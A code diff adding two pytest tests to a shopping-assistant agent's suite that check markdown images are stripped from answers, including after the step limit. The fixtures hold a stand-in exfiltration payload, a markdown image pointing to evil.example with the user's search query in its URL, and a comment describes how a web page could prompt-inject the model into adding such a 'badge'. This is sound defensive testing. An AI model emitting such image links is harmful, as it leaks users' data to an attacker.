@@ -135,6 +135,24 @@ async def test_tool_call_then_answer(session: Session) -> None:
     assert saved[1]["tool_name"] == "search_products" and saved[1]["tool_call_id"] == "call_1"
 
 
+async def test_images_are_stripped_from_answers(session: Session) -> None:
+    # A page could talk the model into "including a badge" whose URL leaks data
+    # when the browser loads it; links stay, images become their alt text.
+    exfil = "![verified](https://evil.example/b.png?q=find+earbuds)"
+    llm = FakeLLM(answer(f"Try the [boAt Airdopes 141](https://www.amazon.in/dp/B09N3ZNHTY). {exfil}"))
+    result = await core.run_agent(session.id, "find earbuds", llm=llm)
+    assert result.response == "Try the [boAt Airdopes 141](https://www.amazon.in/dp/B09N3ZNHTY). verified"
+    saved = await queries.get_messages(session.id)
+    assert "evil.example" not in saved[-1]["content"]  # nor in history
+
+
+async def test_images_are_stripped_from_step_limit_answers(session: Session, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(settings, "max_agent_steps", 1)
+    llm = FakeLLM(tool_calls(search_call()), answer("Found these. ![x](https://evil.example/p.png)"))
+    result = await core.run_agent(session.id, "find earbuds", llm=llm)
+    assert "evil.example" not in result.response
+
+
 async def test_answer_without_tools(session: Session) -> None:
     llm = FakeLLM(answer("Could you tell me your budget?"))
     result = await core.run_agent(session.id, "I need earbuds", llm=llm, small_llm=llm)
